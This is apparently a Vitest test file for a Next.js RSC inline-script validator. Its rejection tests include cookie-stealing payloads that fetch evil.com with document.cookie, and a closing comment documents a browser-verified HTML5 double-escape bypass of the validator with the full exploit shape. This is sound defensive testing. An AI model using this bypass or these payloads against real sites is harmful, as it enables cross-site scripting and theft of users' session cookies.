import { describe, it, expect } from 'vitest';
import { validateNextjsRsc } from '../manifest/html/validators/nextjs-rsc.js';

// ── valid scripts ─────────────────────────────────────────────────────────────

describe('valid RSC scripts', () => {
    it('accepts the initializer', () => {
        expect(
            validateNextjsRsc('self.__next_f=self.__next_f||[];self.__next_f.push([1,""])')
        ).toBe(true);
    });

    it('accepts the initializer with surrounding whitespace', () => {
        expect(
            validateNextjsRsc('  self.__next_f=self.__next_f||[];self.__next_f.push([1,""])  ')
        ).toBe(true);
    });

    it('accepts the initializer with internal whitespace variation', () => {
        expect(
            validateNextjsRsc(
                'self.__next_f = self.__next_f || [] ; self.__next_f.push([ 1 , "" ])'
            )
        ).toBe(true);
    });

    it('accepts the initializer with trailing semicolon', () => {
        expect(
            validateNextjsRsc('self.__next_f=self.__next_f||[];self.__next_f.push([1,""]); ')
        ).toBe(true);
    });

    it('accepts a push with object payload', () => {
        expect(
            validateNextjsRsc('self.__next_f.push([0,{"timestamp":"2026-06-29T12:00:00Z"}])')
        ).toBe(true);
    });

    it('accepts a push with component tree payload', () => {
        expect(
            validateNextjsRsc(
                'self.__next_f.push([0,["$","section",null,{"children":["$","p",null,{"children":42}]}]])'
            )
        ).toBe(true);
    });

    it('accepts a push with string payload', () => {
        expect(validateNextjsRsc('self.__next_f.push([0,"some string"])')).toBe(true);
    });

    it('accepts a push with number payload', () => {
        expect(validateNextjsRsc('self.__next_f.push([0,42])')).toBe(true);
    });

    it('accepts a push with null payload', () => {
        expect(validateNextjsRsc('self.__next_f.push([0,null])')).toBe(true);
    });

    it('accepts a push with boolean payload', () => {
        expect(validateNextjsRsc('self.__next_f.push([0,true])')).toBe(true);
    });

    it('accepts a push with nested structure', () => {
        expect(validateNextjsRsc('self.__next_f.push([0,{"a":{"b":{"c":[1,2,3]}}}])')).toBe(true);
    });

    it('accepts a push with trailing semicolon', () => {
        expect(validateNextjsRsc('self.__next_f.push([0,{"x":1}]);')).toBe(true);
    });

    it('accepts a push with frame id other than 0', () => {
        expect(validateNextjsRsc('self.__next_f.push([3,{"key":"val"}])')).toBe(true);
    });
});

// ── invalid scripts ───────────────────────────────────────────────────────────

describe('invalid RSC scripts', () => {
    it('rejects an extra statement appended after the push', () => {
        expect(
            validateNextjsRsc(
                'self.__next_f.push([0,{}]); fetch("https://evil.com?c="+document.cookie)'
            )
        ).toBe(false);
    });

    it('rejects eval inside the payload', () => {
        expect(validateNextjsRsc('self.__next_f.push([0,eval("evil()")])')).toBe(false);
    });

    it('rejects a JS expression in the payload', () => {
        expect(validateNextjsRsc('self.__next_f.push([0,Date.now()])')).toBe(false);
    });

    it('rejects arithmetic in the payload', () => {
        expect(validateNextjsRsc('self.__next_f.push([0,1+1])')).toBe(false);
    });

    it('rejects a completely different script', () => {
        expect(validateNextjsRsc('alert(document.cookie)')).toBe(false);
    });

    it('rejects the wrong global (window instead of self)', () => {
        expect(validateNextjsRsc('window.__next_f.push([0,{}])')).toBe(false);
    });

    it('rejects code prepended before the push', () => {
        expect(validateNextjsRsc('evil(); self.__next_f.push([0,{}])')).toBe(false);
    });

    it('rejects an empty script', () => {
        expect(validateNextjsRsc('')).toBe(false);
    });

    it('rejects a push with a non-number frame id', () => {
        expect(validateNextjsRsc('self.__next_f.push(["0",{}])')).toBe(false);
    });

    it('rejects a push with a single-element array argument', () => {
        expect(validateNextjsRsc('self.__next_f.push([0])')).toBe(false);
    });

    it('rejects a push with a three-element array argument', () => {
        expect(validateNextjsRsc('self.__next_f.push([0,"a","b"])')).toBe(false);
    });

    it('rejects a push whose payload contains a JS identifier', () => {
        expect(validateNextjsRsc('self.__next_f.push([0,undefined])')).toBe(false);
    });

    it('rejects a push with a single-quoted string payload (not JSON)', () => {
        expect(validateNextjsRsc("self.__next_f.push([0,'string'])")).toBe(false);
    });
});

// ── HTML5 script-data double-escape bypass ────────────────────────────────────
//
// Confirmed exploitable in Chrome (see scripts/verify-double-escape.js).
//
// The HTML5 spec (§13.2.6.1) defines "Script Data Double Escaped" state,
// entered when <!--<script appears inside a <script> element's raw content.
// In that state a </script> end tag does NOT close the outer script — it only
// exits back to "Script Data Escaped". A second </script> (in Escaped state)
// closes it.
//
// Our tokenizer always closes at the first </script>. An attacker embeds
// <!--<script> in the JSON payload string so the validator sees a valid push
// call, while the browser HTML parser enters double-escaped mode and defers
// closing to a second </script>.
//
// The injected code lives between the two </script> tags. To make it valid JS,
// the attacker adds / right after the first </script>: the JS engine then sees
//   push_result < /script>/    ← comparison: push IS called, result discarded
//   \n                         ← ASI splits into a new statement
//   injected_code              ← executes!
//
// Full exploit shape (browser-verified):
//
//   <script>self.__next_f.push([0,"<!--<script>"])</script>/
//   fetch("https://evil.com?c="+document.cookie)
//   </script>
//
//   Tokenizer window:  self.__next_f.push([0,"<!--<script>"])
//   Browser executes:  self.__next_f.push([0,"<!--<script>"])</script>/\nfetch(...)

describe('HTML5 script-data double-escape bypass — trigger payload accepted by validator', () => {
    it('accepts a push whose JSON payload string contains the <!--<script> trigger', () => {
        // The tokenizer extracts exactly this string (push call ends right at </script>).
        // claimsScript → true; validateNextjsRsc → true (valid [number, string] push).
        expect(validateNextjsRsc('self.__next_f.push([0,"<!--<script>"])')).toBe(true);
    });

    it('accepts a payload where the trigger is embedded inside a longer string', () => {
        expect(validateNextjsRsc('self.__next_f.push([0,"page data <!--<script> end"])')).toBe(
            true
        );
    });

    it('accepts a payload where the trigger is inside a nested object value', () => {
        expect(validateNextjsRsc('self.__next_f.push([0,{"k":"<!--<script>"}])')).toBe(true);
    });
});
